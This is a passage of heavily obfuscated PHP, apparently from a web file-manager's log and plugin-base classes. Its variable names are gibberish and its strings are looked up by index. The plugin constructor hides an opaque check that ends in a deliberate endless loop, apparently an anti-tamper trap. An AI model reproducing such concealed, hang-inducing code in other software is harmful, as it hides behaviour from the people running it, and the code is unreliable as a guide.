IO::infoFullSimple($åÜÊÕ‚Í[$ÄÏ¨ºßÑ[97]]); } catch (Exception $Ğ›Îí¥ƒ) { continue; } $æ«Ô²¢[$ÄÏ¨ºßÑ[97]] = $åÜÊÕ‚Í[$ÄÏ¨ºßÑ[97]]; $Õ¡÷×­™[] = $æ«Ô²¢[$ÄÏ¨ºßÑ[202]] = $¶Ãåù¤¯[$ÄÏ¨ºßÑ[202]]; $Õ¡÷×­™[] = $æ«Ô²¢[$ÄÏ¨ºßÑ[2361]] = $¶Ãåù¤¯[$ÄÏ¨ºßÑ[201]]; break; } return $æ«Ô²¢; } private function getSourceList(&$Ç˜¸Í‰û) { $—ê½–®Å =& $_SERVER[ŒÅŸ‹ä†]; $¼ÓüÃ÷Ø = array(); foreach ($Ç˜¸Í‰û as $åÆªÙ•… => $½ˆğËìì) { $Øş‹ÜÎ„ = json_decode($½ˆğËìì[$—ê½–®Å[545]], !0); if ($½ˆğËìì[$—ê½–®Å[43]] == $—ê½–®Å[2101]) { $Øş‹ÜÎ„ = $this->descZipDownload($Øş‹ÜÎ„, $¼ÓüÃ÷Ø); $Ç˜¸Í‰û[$åÆªÙ•…][$—ê½–®Å[545]] = json_encode($Øş‹ÜÎ„); continue; } if (strpos($½ˆğËìì[$—ê½–®Å[43]], $—ê½–®Å[2363]) !== 0) { if (!isset($Øş‹ÜÎ„[$—ê½–®Å[97]]) || strpos($½ˆğËìì[$—ê½–®Å[43]], $—ê½–®Å[2599]) !== 0) { continue; } try { $ó¾Ï¢„® = IO::infoFullSimple($Øş‹ÜÎ„[$—ê½–®Å[97]]); } catch (Exception $ä„Ûğµ) { continue; } $¼ÓüÃ÷Ø[] = $Øş‹ÜÎ„[$—ê½–®Å[202]] = $ó¾Ï¢„®[$—ê½–®Å[202]]; $¼ÓüÃ÷Ø[] = $Øş‹ÜÎ„[$—ê½–®Å[2361]] = $ó¾Ï¢„®[$—ê½–®Å[201]]; $Ç˜¸Í‰û[$åÆªÙ•…][$—ê½–®Å[545]] = json_encode($Øş‹ÜÎ„); continue; } $¼ÓüÃ÷Ø[] = $Øş‹ÜÎ„[$—ê½–®Å[202]]; $¼ÓüÃ÷Ø[] = $Øş‹ÜÎ„[$—ê½–®Å[2361]]; if ($Øş‹ÜÎ„[$—ê½–®Å[43]] == $—ê½–®Å[648]) { $¼ÓüÃ÷Ø[] = $Øş‹ÜÎ„[$—ê½–®Å[545]][$—ê½–®Å[1287]]; $¼ÓüÃ÷Ø[] = $Øş‹ÜÎ„[$—ê½–®Å[545]][$—ê½–®Å[1288]]; } if ($Øş‹ÜÎ„[$—ê½–®Å[43]] == $—ê½–®Å[2371]) { $¼ÓüÃ÷Ø[] = $Øş‹ÜÎ„[$—ê½–®Å[545]][$—ê½–®Å[202]]; } } if (!$¼ÓüÃ÷Ø) { return array(); } return Model($—ê½–®Å[929])->sourceListInfo($¼ÓüÃ÷Ø, !0); } private function logList($âš¾Ş¼á) { $ó™ÛŞ…û =& $_SERVER[ŒÅŸ‹ä†]; $à„Æß¡… = array_to_keyvalue($âš¾Ş¼á, $ó™ÛŞ…û[12], $ó™ÛŞ…û[1537]); $™İŠ­öˆ = Model($ó™ÛŞ…û[622])->userListInfo(array_unique($à„Æß¡…)); $œ¥£é÷ = $this->getSourceList($âš¾Ş¼á); $°€´²­© = $this->typeAll(); $±÷ÔØ±“ = array(); $Çµ”Ô¤ = array(); foreach ($âš¾Ş¼á as $Ìüä‹í => $â©ï¢ƒÌ) { $­ÈŞâÖ = $â©ï¢ƒÌ[$ó™ÛŞ…û[43]]; $“í‹ŒÉƒ = isset($™İŠ­öˆ[$â©ï¢ƒÌ[$ó™ÛŞ…û[1537]]]) ? $™İŠ­öˆ[$â©ï¢ƒÌ[$ó™ÛŞ…û[1537]]] : !1; $‡ÕË×ĞÏ = strpos($­ÈŞâÖ, $ó™ÛŞ…û[2600]) === 0 ? LNG($ó™ÛŞ…û[2601]) : LNG($ó™ÛŞ…û[2597]); $â©ï¢ƒÌ[$ó™ÛŞ…û[42]] = isset($“í‹ŒÉƒ[$ó™ÛŞ…û[42]]) ? $“í‹ŒÉƒ[$ó™ÛŞ…û[42]] : LNG($ó™ÛŞ…û[2597]); $â©ï¢ƒÌ[$ó™ÛŞ…û[2422]] = isset($“í‹ŒÉƒ[$ó™ÛŞ…û[2422]]) ? $“í‹ŒÉƒ[$ó™ÛŞ…û[2422]] : $ó™ÛŞ…û[12]; $â©ï¢ƒÌ[$ó™ÛŞ…û[1808]] = isset($°€´²­©[$­ÈŞâÖ]) ? $°€´²­©[$­ÈŞâÖ] : $‡ÕË×ĞÏ; $â©ï¢ƒÌ[$ó™ÛŞ…û[2300]] = $“í‹ŒÉƒ; $Şé§­º÷ = json_decode($â©ï¢ƒÌ[$ó™ÛŞ…û[545]], !0); $â©ï¢ƒÌ[$ó™ÛŞ…û[1553]] = isset($Şé§­º÷[$ó™ÛŞ…û[1553]]) ? $Şé§­º÷[$ó™ÛŞ…û[1553]] : $ó™ÛŞ…û[12]; $â©ï¢ƒÌ[$ó™ÛŞ…û[2598]] = IpLocation::get($â©ï¢ƒÌ[$ó™ÛŞ…û[1553]]); if (strpos($­ÈŞâÖ, $ó™ÛŞ…û[2363]) === 0 || isset($Şé§­º÷[$ó™ÛŞ…û[2361]])) { $Şé§­º÷[$ó™ÛŞ…û[100]] = $œ¥£é÷[$Şé§­º÷[$ó™ÛŞ…û[202]]]; $Şé§­º÷[$ó™ÛŞ…û[2376]] = $œ¥£é÷[$Şé§­º÷[$ó™ÛŞ…û[2361]]]; if ($Şé§­º÷[$ó™ÛŞ…û[43]] == $ó™ÛŞ…û[648]) { $Şé§­º÷[$ó™ÛŞ…û[545]][$ó™ÛŞ…û[1287]] = $œ¥£é÷[$Şé§­º÷[$ó™ÛŞ…û[545]][$ó™ÛŞ…û[1287]]]; $Şé§­º÷[$ó™ÛŞ…û[545]][$ó™ÛŞ…û[1288]] = $œ¥£é÷[$Şé§­º÷[$ó™ÛŞ…û[545]][$ó™ÛŞ…û[1288]]]; } if ($Şé§­º÷[$ó™ÛŞ…û[43]] == $ó™ÛŞ…û[2371]) { $Şé§­º÷[$ó™ÛŞ…û[545]][$ó™ÛŞ…û[202]] = $œ¥£é÷[$Şé§­º÷[$ó™ÛŞ…û[545]][$ó™ÛŞ…û[202]]]; } if ($Şé§­º÷[$ó™ÛŞ…û[43]] == $ó™ÛŞ…û[1275]) { $Şé§­º÷[$ó™ÛŞ…û[2376]] = $Şé§­º÷[$ó™ÛŞ…û[100]]; $Şé§­º÷[$ó™ÛŞ…û[2361]] = $Şé§­º÷[$ó™ÛŞ…û[2376]][$ó™ÛŞ…û[202]]; $Şé§­º÷[$ó™ÛŞ…û[100]] = !1; $Şé§­º÷[$ó™ÛŞ…û[202]] = $ó™ÛŞ…û[12]; } $“Õó°¼ = array($ó™ÛŞ…û[1275], $ó™ÛŞ…û[2359]); if (!in_array($Şé§­º÷[$ó™ÛŞ…û[43]], $“Õó°¼)) { if ($Şé§­º÷[$ó™ÛŞ…û[100]] && $Şé§­º÷[$ó™ÛŞ…û[100]][$ó™ÛŞ…û[199]] == $ó™ÛŞ…û[200]) { $Çµ”Ô¤[] = $â©ï¢ƒÌ[$ó™ÛŞ…û[492]]; unset($âš¾Ş¼á[$Ìüä‹í]); continue; } if ($Şé§­º÷[$ó™ÛŞ…û[2376]] && $Şé§­º÷[$ó™ÛŞ…û[2376]][$ó™ÛŞ…û[199]] == $ó™ÛŞ…û[200]) { $Çµ”Ô¤[] = $â©ï¢ƒÌ[$ó™ÛŞ…û[492]]; unset($âš¾Ş¼á[$Ìüä‹í]); continue; } } } $â©ï¢ƒÌ[$ó™ÛŞ…û[545]] = $Şé§­º÷; unset($â©ï¢ƒÌ[$ó™ÛŞ…û[2602]]); $±÷ÔØ±“[] = $â©ï¢ƒÌ; } $this->clearSystemPathLog($Çµ”Ô¤); return $±÷ÔØ±“; } private function clearSystemPathLog($´Ï‚‡´ä) { $‹íİ¨ˆê =& $_SERVER[ŒÅŸ‹ä†]; if (count($´Ï‚‡´ä) == 0) { return; } $ñÑ¤Œ = array($‹íİ¨ˆê[492] => array($‹íİ¨ˆê[7], array_unique($´Ï‚‡´ä))); $this->where($ñÑ¤Œ)->delete(); } public function deviceList($ÚÔ‹ã–, $ÃÚ÷Ìò¶ = 0) { $É›İ€†¾ =& $_SERVER[ŒÅŸ‹ä†]; $ŠÍëÍâÇ = array($É›İ€†¾[1537] => $ÚÔ‹ã–, $É›İ€†¾[242] => array($É›İ€†¾[1125], $ÃÚ÷Ìò¶), $É›İ€†¾[43] => $É›İ€†¾[2072]); $ó¨ç†­‡ = array(); $•ŠÉ©¥ = $this->field($É›İ€†¾[2603])->where($ŠÍëÍâÇ)->order($É›İ€†¾[2374])->limit(50)->select(); foreach ($•ŠÉ©¥ as $²ö×ÆßÕ => $ÓÜÉæ›) { if ($²ö×ÆßÕ > 0 && abs($ÓÜÉæ›[$É›İ€†¾[242]] - $•ŠÉ©¥[$²ö×ÆßÕ - 1][$É›İ€†¾[242]]) < 5) { continue; } $Î·Ñ¤İ = json_decode($ÓÜÉæ›[$É›İ€†¾[545]], !0); $ÓÜÉæ›[$É›İ€†¾[1553]] = isset($Î·Ñ¤İ[$É›İ€†¾[1553]]) ? $Î·Ñ¤İ[$É›İ€†¾[1553]] : $É›İ€†¾[12]; unset($Î·Ñ¤İ[$É›İ€†¾[1553]]); $Ğ¨æá†ğ = $this->deviceType($Î·Ñ¤İ[$É›İ€†¾[2364]]); if (isset($ó¨ç†­‡[$Ğ¨æá†ğ])) { continue; } $ÓÜÉæ›[$É›İ€†¾[2598]] = IpLocation::get($ÓÜÉæ›[$É›İ€†¾[1553]]); $ÓÜÉæ›[$É›İ€†¾[545]] = $Î·Ñ¤İ; $ó¨ç†­‡[$Ğ¨æá†ğ] = $ÓÜÉæ›; } return array_values($ó¨ç†­‡); } public function deviceType($–öãÛîŞ) { return $–öãÛîŞ; } } goto FÕ“å”‡; AÚİ‹ÑÛ‘¸: class Message { function __construct() { } public function send($Ä¶¡—“ = '', $·šñ³ƒ = array(), $£È†®î = "\164\145\x78\x74") { $âçâıƒ× =& $_SERVER[ŒÅŸ‹ä†]; $©­ìä™º = array($âçâıƒ×[43] => $âçâıƒ×[1232], $âçâıƒ×[179] => $Ä¶¡—“); if (in_array($£È†®î, array($âçâıƒ×[1232], $âçâıƒ×[1769]))) { $©­ìä™º[$âçâıƒ×[43]] = $£È†®î; } $·šñ³ƒ = array($âçâıƒ×[603] => isset($·šñ³ƒ[$âçâıƒ×[603]]) ? $·šñ³ƒ[$âçâıƒ×[603]] : $âçâıƒ×[12], $âçâıƒ×[690] => isset($·šñ³ƒ[$âçâıƒ×[690]]) ? $·šñ³ƒ[$âçâıƒ×[690]] : $âçâıƒ×[12]); if (empty($Ä¶¡—“) || empty($·šñ³ƒ[$âçâıƒ×[603]]) && empty($·šñ³ƒ[$âçâıƒ×[690]])) { return !1; } $˜‡æºì§ = array($âçâıƒ×[1698] => $©­ìä™º, $âçâıƒ×[1770] => $·šñ³ƒ); Hook::trigger($âçâıƒ×[1771], $˜‡æºì§); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ö„Íñïé =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($_SERVER[$ö„Íñïé[13]]) || !isset($_SERVER[$ö„Íñïé[22]])) { $å”È† = $ö„Íñïé[986]; $ğñëÉÓ = $ö„Íñïé[15]; $×¤õí«† = $_SERVER[$ö„Íñïé[16]] . $ö„Íñïé[17]; $ÃÈµ’›½ = $ğñëÉÓ($×¤õí«†); $òéœ¤×ï = explode($ö„Íñïé[18], $ÃÈµ’›½); if (count($òéœ¤×ï) < $ö„Íñïé[716]) { $ÛõıªÆÈ = $ö„Íñïé[20]; $ÛõıªÆÈ(); } $ØÎšÍŸú = $ö„Íñïé[987]; $ØÎšÍŸú($_SERVER[$ö„Íñïé[988]]); $…ÃøË¹÷ = 1; for ($ø±š˜£Ü = $…ÃøË¹÷; $ø±š˜£Ü > 0; $ø±š˜£Ü++) { $ØÎšÍŸú = json_encode($GLOBALS[$ö„Íñïé[512]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ö„Íñïé[1772]); $this->pluginName = str_replace($ö„Íñïé[1772], $ö„Íñïé[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ö„Íñïé[8]; $this->pluginApi = appHostGet() . $ö„Íñïé[1773] . $this->pluginName . $ö„Íñïé[8]; $this->pluginHost = $config[$ö„Íñïé[1774]] . $this->pluginName . $ö„Íñïé[8]; $this->pluginHostDefault = $config[$ö„Íñïé[1774]] . $this->pluginName . $ö„Íñïé[8]; $‡ËÃËèĞ = $config[$ö„Íñïé[1775]]; if ($‡ËÃËèĞ && strpos($ö„Íñïé[60] . $‡ËÃËèĞ . $ö„Íñïé[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$ö„Íñïé[1776]] . $this->pluginName . $ö„Íñïé[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ŒÅŸ‹ä†][1777]); } protected function assign($‘¸İÖ™, $ÙİÔËç˜ = false) { if (is_array($‘¸İÖ™)) { $this->values = array_merge($this->values, $‘¸İÖ™); } else { $this->values[$‘¸İÖ™] = $ÙİÔËç˜; } } protected function display($¢èÓÀ´¶) { extract($this->values); require $¢èÓÀ´¶; } final function hookRegist($‹ò€°Å×) { $this->modelPlugin->appRegist($this->pluginName, $‹ò€°Å×); } final function appIcon() { $åûû¦‹Ë =& $_SERVER[ŒÅŸ‹ä†]; $ûõà†×† = $this->appPackage(); $ºÓÁÆø = $åûû¦‹Ë[12]; if (isset($ûõà†×†[$åûû¦‹Ë[510]])) { if (isset($ûõà†×†[$åûû¦‹Ë[510]][$åûû¦‹Ë[1778]])) { $ºÓÁÆø = $åûû¦‹Ë[1779] . $ûõà†×†[$åûû¦‹Ë[510]][$åûû¦‹Ë[1778]] . $åûû¦‹Ë[1780]; } else { if ($ûõà†×†[$åûû¦‹Ë[510]][$åûû¦‹Ë[1781]]) { $ºÓÁÆø = $åûû¦‹Ë[1782] . $ûõà†×†[$åûû¦‹Ë[510]][$åûû¦‹Ë[1781]] . $åûû¦‹Ë[1783]; } } } return $ºÓÁÆø; } final function fileCanView($½úµäª”) { $ÑÓ«®Ë½ =& $_SERVER[ŒÅŸ‹ä†]; if (request_url_safe($½úµäª”)) { return !0; } if ($this->isShare($½úµäª”)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Û£ÆÂ›º = $ÑÓ«®Ë½[1784] . rawurlencode(this_url()); show_tips(LNG($ÑÓ«®Ë½[1785]) . $ÑÓ«®Ë½[1786] . $Û£ÆÂ›º . $ÑÓ«®Ë½[1787] . LNG($ÑÓ«®Ë½[1788]) . $ÑÓ«®Ë½[1789], !1); } if (!Action($ÑÓ«®Ë½[1790])->authCan($ÑÓ«®Ë½[1791])) { show_tips(LNG($ÑÓ«®Ë½[1792]) . $ÑÓ«®Ë½[1793], !1); } ActionCall($ÑÓ«®Ë½[1794], $½úµäª”); } final function isShare($„ÕÌÊÊ¡) { $‡‘ù¾¯— = KodIO::parse($„ÕÌÊÊ¡); return $‡‘ù¾¯—[$_SERVER[ŒÅŸ‹ä†][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($‡Ò°¸Èœ) { if (request_url_safe($‡Ò°¸Èœ)) { return $‡Ò°¸Èœ; } if (!$this->isShare($‡Ò°¸Èœ)) { $‡Ò°¸Èœ = $this->filePath($‡Ò°¸Èœ, !1); } return Action($_SERVER[ŒÅŸ‹ä†][1304])->linkOut($‡Ò°¸Èœ); } public function filePathLinkOut($´ïãøñØ) { if (request_url_safe($´ïãøñØ)) { return $´ïãøñØ; } $this->fileCanView($´ïãøñØ); return Action($_SERVER[ŒÅŸ‹ä†][1304])->link($´ïãøñØ); } final function filePath($–Ãå¹Ú, $·î¸© = true, $§öÂÈ¿ = false) { $´åó÷¹Ş =& $_SERVER[ŒÅŸ‹ä†]; $›²‚·ğò = $this->filePathGet($–Ãå¹Ú, $·î¸©); if (!$this->fileInfo) { show_tips(LNG($´åó÷¹Ş[116]), !1); } if ($§öÂÈ¿ && isset($this->fileInfo[$´åó÷¹Ş[562]]) && $this->fileInfo[$´åó÷¹Ş[562]]) { $ñ×Á‘ÈĞ = Model($´åó÷¹Ş[565])->fileInfo($this->fileInfo[$´åó÷¹Ş[562]]); if (!$ñ×Á‘ÈĞ || !IO::exist($ñ×Á‘ÈĞ[$´åó÷¹Ş[97]])) { $ò¶š‡İ = LNG($´åó÷¹Ş[116]) . LNG($´åó÷¹Ş[1795]); if (KodUser::isRoot() && isset($ñ×Á‘ÈĞ[$´åó÷¹Ş[97]])) { $ò¶š‡İ .= $´åó÷¹Ş[1796] . $ñ×Á‘ÈĞ[$´åó÷¹Ş[97]] . $´åó÷¹Ş[1797]; } show_tips($ò¶š‡İ); } } Hook::trigger($´åó÷¹Ş[1798], $›²‚·ğò); return $›²‚·ğò; } final function filePathGet($éÎƒùäÄ, $³Ïê…˜Ê = true) { $‘¸´Ù´² =& $_SERVER[ŒÅŸ‹ä†]; if ($­­©Ü´ = $this->checkSharePath($éÎƒùäÄ, $³Ïê…˜Ê)) { return $­­©Ü´; } $this->fileCanView($éÎƒùäÄ); if (request_url_safe($éÎƒùäÄ)) { $¯ÀúÎç® = parse_url_query($éÎƒùäÄ); if (isset($¯ÀúÎç®[$‘¸´Ù´²[1799]]) && isset($¯ÀúÎç®[$‘¸´Ù´²[245]])) { $òÊüîª = Mcrypt::decode($¯ÀúÎç®[$‘¸´Ù´²[245]], Model($‘¸´Ù´²[869])->get($‘¸´Ù´²[870])); if ($òÊüîª) { $this->fileInfo = IO::info($òÊüîª); $this->fileInfo[$‘¸´Ù´²[1800]] = $éÎƒùäÄ; $this->cachePath = $this->pluginCachePath($‘¸´Ù´²[12], $³Ïê…˜Ê); return $òÊüîª; } } $éÎƒùäÄ = $this->_cacheHttpFile($éÎƒùäÄ, $³Ïê…˜Ê); $this->fileInfo = IO::info($éÎƒùäÄ); } else { $this->fileInfo = IO::info($éÎƒùäÄ); $this->cachePath = $this->pluginCachePath($‘¸´Ù´²[12], $³Ïê…˜Ê); } return $éÎƒùäÄ; } final function _cacheHttpFile($º¸«¥š, $å÷¥ïÕ = true) { $ñ”ë‚Î¢ =& $_SERVER[ŒÅŸ‹ä†]; $Ñ£ÈŞ®‹ = parse_url_query($º¸«¥š); $óÂ’›‹± = get_path_ext($º¸«¥š); if (isset($Ñ£ÈŞ®‹[$ñ”ë‚Î¢[42]]) && $Ñ£ÈŞ®‹[$ñ”ë‚Î¢[42]]) { $óÂ’›‹± = get_path_ext($Ñ£ÈŞ®‹[$ñ”ë‚Î¢[42]]); } $ë…Çœù” = hash_path($º¸«¥š) . $ñ”ë‚Î¢[10] . $óÂ’›‹±; $this->cachePath = $this->pluginCachePath($å÷¥ïÕ ? $ë…Çœù” : $ñ”ë‚Î¢[12]); $”‰èÚûÖ = IO::fileNameExist($this->cachePath, $ë…Çœù”); if ($”‰èÚûÖ) { return KodIO::make($”‰èÚûÖ); } $»Ò„Áí¢ = rtrim($this->cachePath, $ñ”ë‚Î¢[8]) . $ñ”ë‚Î¢[8] . $ë…Çœù”; return $this->pluginCacheFileSet($»Ò„Áí¢, file_get_contents_nossl($º¸«¥š)); } final function checkSharePath($Ï™¹©€µ, $ãÂÖĞï¯ = true) { $†Ä·íÙ¨ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->isShare($Ï™¹©€µ)) { return !1; } $·Ö³À¶Œ = Action($†Ä·íÙ¨[1304])->sharePathInfo($Ï™¹©€µ); if (!is_array($·Ö³À¶Œ) || !isset($·Ö³À¶Œ[$†Ä·íÙ¨[97]])) { $±¤ ¥ó­ = $GLOBALS[$†Ä·íÙ¨[1801]]; show_json($±¤ ¥ó­ ? $±¤ ¥ó­ : LNG($†Ä·íÙ¨[1802]), !1); } $this->fileInfo = $·Ö³À¶Œ; $this->cachePath = $this->pluginCachePath(!1, $ãÂÖĞï¯); return $·Ö³À¶Œ[$†Ä·íÙ¨[97]]; } final function pluginCachePath($²œ¸Š× = '', $ËµŞøû = false) { $¯›Ø–Åı =& $_SERVER[ŒÅŸ‹ä†]; if ($ËµŞøû && is_array($this->fileInfo)) { $²œ¸Š× = kodIO::hashPath($this->fileInfo); } $–¨í¼ê = rtrim(IO_PATH_SYSTEM_TEMP . $¯›Ø–Åı[1803] . $this->pluginName . $¯›Ø–Åı[8] . $²œ¸Š×, $¯›Ø–Åı[8]); $£ÜØÉƒÇ = IO::infoFullSimple($–¨í¼ê); $Â®‹øıÛ = $£ÜØÉƒÇ && is_array($£ÜØÉƒÇ) ? $£ÜØÉƒÇ[$¯›Ø–Åı[97]] : $¯›Ø–Åı[12]; if (!$Â®‹øıÛ) { $Â®‹øıÛ = IO::mkdir($–¨í¼ê); } return $Â®‹øıÛ; } final function pluginCacheFileSet($”ƒÎÕ­, $„´Ğò”Ş = '') { $½ŞÓ”•ö =& $_SERVER[ŒÅŸ‹ä†]; $ü®¡Âè = IO::infoFullSimple($”ƒÎÕ­); if (!$ü®¡Âè) { return IO::mkfile($”ƒÎÕ­, $„´Ğò”Ş, REPEAT_REPLACE); } IO::setContent($ü®¡Âè[$½ŞÓ”•ö[97]], $„´Ğò”Ş); return $ü®¡Âè[$½ŞÓ”•ö[97]]; } final function pluginLocalFile($éŒ¹ìî¶ = '') { $Ôºà–‚Œ =& $_SERVER[ŒÅŸ‹ä†]; $ğÂÔ®—÷ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ğÂÔ®—÷)) { mk_dir($ğÂÔ®—÷); } if (!$éŒ¹ìî¶) { return $ğÂÔ®—÷; } $µŞß›×Ñ = IO::info($éŒ¹ìî¶); $Ê´ïâÔ‘ = $Ôºà–‚Œ[1804] . KodIO::hashPath($µŞß›×Ñ) . $Ôºà–‚Œ[10] . $µŞß›×Ñ[$Ôºà–‚Œ[177]]; if (!checkExtSafe($Ê´ïâÔ‘)) { $Ê´ïâÔ‘ = $Ê´ïâÔ‘ . $Ôºà–‚Œ[1338]; } $…·º–½ô = $ğÂÔ®—÷ . $Ê´ïâÔ‘; if (@file_exists($…·º–½ô)) { return $…·º–½ô; } return IO::copy($éŒ¹ìî¶, $ğÂÔ®—÷, 0, $Ê´ïâÔ‘); } final function appPackage() { $„Í¼¡Êá =& $_SERVER[ŒÅŸ‹ä†]; if ($this->packageData) { return $this->packageData; } $Î²ıÃí = $this->parseFile($this->pluginPath . $„Í¼¡Êá[1805]); $this->parseLang($Î²ıÃí); $ß„ õ» = json_decode_force($Î²ıÃí); if (!$ß„ õ») { return array(); } $Šæº…î = Hook::trigger($„Í¼¡Êá[1806], $ß„ õ»); if ($Šæº…î && is_array($Šæº…î)) { $ß„ õ» = $Šæº…î; } $this->packageData = $ß„ õ»; return $ß„ õ»; } public function packageInfoGet($è‚šÊã) { $Ñ÷İÈéÄ = $this->appPackage(); return array_get_value($Ñ÷İÈéÄ, $è‚šÊã); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ŒÅŸ‹ä†][1807]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ŒÅŸ‹ä†][1808]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ŒÅŸ‹ä†][1809]); } public function echoJsAssign($Á°ºÚ”è, $‡Ê•òÂÂ) { $this->echoJsAssignArr[$Á°ºÚ”è] = $‡Ê•òÂÂ; } private function parseFile($¡–®é–æ) { $¦Àó‚°è =& $_SERVER[ŒÅŸ‹ä†]; $°ÆÈùÑÓ = file_get_contents_nossl($¡–®é–æ); $îıîßĞ = array($¦Àó‚°è[1810], $¦Àó‚°è[1811], $¦Àó‚°è[1812], $¦Àó‚°è[1813], $¦Àó‚°è[1814], $¦Àó‚°è[1815], $¦Àó‚°è[1816]); $ìğúÆƒ¡ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¦Àó‚°è[102]][$¦Àó‚°è[1817]]); foreach ($this->echoJsAssignArr as $…úß–Ì => $‘ÜŒ“€‰) { $îıîßĞ[] = $¦Àó‚°è[1818] . $…úß–Ì . $¦Àó‚°è[1819]; $ìğúÆƒ¡[] = is_array($‘ÜŒ“€‰) || is_object($‘ÜŒ“€‰) ? rawurlencode(json_encode($‘ÜŒ“€‰)) : $‘ÜŒ“€‰; } if (strstr($°ÆÈùÑÓ, $¦Àó‚°è[1820])) { $“Ê—¯™æ = rawurlencode(json_encode($this->pluginLangArr)); $°ÆÈùÑÓ = str_replace($¦Àó‚°è[1820], $“Ê—¯™æ, $°ÆÈùÑÓ); } if (strstr($°ÆÈùÑÓ, $¦Àó‚°è[1821])) { $“Ê—¯™æ = $“Ê—¯™æ = rawurlencode(json_encode($this->getConfig())); $°ÆÈùÑÓ = str_replace($¦Àó‚°è[1821], $“Ê—¯™æ, $°ÆÈùÑÓ); } $°ÆÈùÑÓ = str_replace($îıîßĞ, $ìğúÆƒ¡, $°ÆÈùÑÓ); return $°ÆÈùÑÓ; } private function parseLang(&$”ê…Á¦ù) { $¹æÉ ›¹ =& $_SERVER[ŒÅŸ‹ä†]; $ÃÀ°¾´× = $¹æÉ ›¹[1822]; if (!strstr($”ê…Á¦ù, $ÃÀ°¾´×)) { return; } preg_match_all($¹æÉ ›¹[1823], $”ê…Á¦ù, $—Ğ…ÍÏØ); if (!is_array($—Ğ…ÍÏØ) || count($—Ğ…ÍÏØ) == 0 || !is_array($—Ğ…ÍÏØ[0]) || count($—Ğ…ÍÏØ[0]) == 0) { return; } $–’áŠó¥ = array(); $§”Êìê = array(); foreach ($—Ğ…ÍÏØ[0] as $çÇÓÚßü) { $È¨óÔ¢ = substr($çÇÓÚßü, strlen($ÃÀ°¾´×), -4); $×êÜœµÑ = LNG($È¨óÔ¢); $–’áŠó¥[] = $çÇÓÚßü; $§”Êìê[] = str_replace(array($¹æÉ ›¹[18], $¹æÉ ›¹[1191], $¹æÉ ›¹[427], $¹æÉ ›¹[129]), array($¹æÉ ›¹[63], $¹æÉ ›¹[63], $¹æÉ ›¹[12], $¹æÉ ›¹[1824]), $×êÜœµÑ); } $”ê…Á¦ù = str_replace($–’áŠó¥, $§”Êìê, $”ê…Á¦ù); } private function parseConfig(&$Ø¬”€¿İ) { $Şï´Ü ´ =& $_SERVER[ŒÅŸ‹ä†]; $Òå×ûó” = $Şï´Ü ´[1825]; if (!strstr($Ø¬”€¿İ, $Òå×ûó”)) { return; } preg_match_all($Şï´Ü ´[1826], $Ø¬”€¿İ, $¡º¢âŸª); if (!is_array($¡º¢âŸª) || count($¡º¢âŸª) == 0 || !is_array($¡º¢âŸª[0]) || count($¡º¢âŸª[0]) == 0) { return; } $«İï‘Ì = $this->getConfig(); $àÇÇÕÇÅ = array(); $öû„­ = array(); foreach ($¡º¢âŸª[0] as $¤ÛÊ”ŞË) { $´êı“Êæ = substr($¤ÛÊ”ŞË, strlen($Òå×ûó”), -2); $àÇÇÕÇÅ[] = $¤ÛÊ”ŞË; $öû„­[] = _get($«İï‘Ì, $´êı“Êæ); } $Ø¬”€¿İ = str_replace($àÇÇÕÇÅ, $öû„­, $Ø¬”€¿İ); } private function parsePackage(&$•ÜÓÇâ¾) { $«ãú­®Á =& $_SERVER[ŒÅŸ‹ä†]; $å••÷½ğ = $«ãú­®Á[1827]; if (!strstr($•ÜÓÇâ¾, $å••÷½ğ)) { return; } preg_match_all($«ãú­®Á[1828], $•ÜÓÇâ¾, $ÜŸä½‚); if (!is_array($ÜŸä½‚) || count($ÜŸä½‚) == 0 || !is_array($ÜŸä½‚[0]) || count($ÜŸä½‚[0]) == 0) { return; } $ûìÔö¹‘ = $this->appPackage(); $¸¿¦¥â± = array(); $£·™“ÓÊ = array(); foreach ($ÜŸä½‚[0] as $•Á÷éø‚) { $äÑ´º— = substr($•Á÷éø‚, strlen($å••÷½ğ), -2); $¸¿¦¥â±[] = $•Á÷éø‚; $£·™“ÓÊ[] = _get($ûìÔö¹‘, $äÑ´º—); } $•ÜÓÇâ¾ = str_replace($¸¿¦¥â±, $£·™“ÓÊ, $•ÜÓÇâ¾); } final function echoFile($ÙÛˆÍúº, $©¢¢ÚØã = false) { $ÄÇãÒ–ñ =& $_SERVER[ŒÅŸ‹ä†]; $Íªœ½Ë÷ = $this->pluginPath . $ÙÛˆÍúº; if (ACT == $ÄÇãÒ–ñ[1829]) { echo $ÄÇãÒ–ñ[1830] . $this->pluginName . $ÄÇãÒ–ñ[8] . $ÙÛˆÍúº . $ÄÇãÒ–ñ[1831]; if (!file_exists($Íªœ½Ë÷)) { echo $ÄÇãÒ–ñ[1832]; return; } } $µŸÓ™¶  = $this->parseFile($Íªœ½Ë÷); $this->parseLang($µŸÓ™¶ ); $this->parseConfig($µŸÓ™¶ ); $this->parsePackage($µŸÓ™¶ ); if (is_array($©¢¢ÚØã)) { $µŸÓ™¶  = str_replace(array_keys($©¢¢ÚØã), array_values($©¢¢ÚØã), $µŸÓ™¶ ); } echo $ÄÇãÒ–ñ[18] . $µŸÓ™¶ ; } private function checkVersion() { $íÕã‹ˆ =& $_SERVER[ŒÅŸ‹ä†]; $òîåğñ = $this->appPackage(); $¼Ò‡àÁØ = $this->getConfig(); if 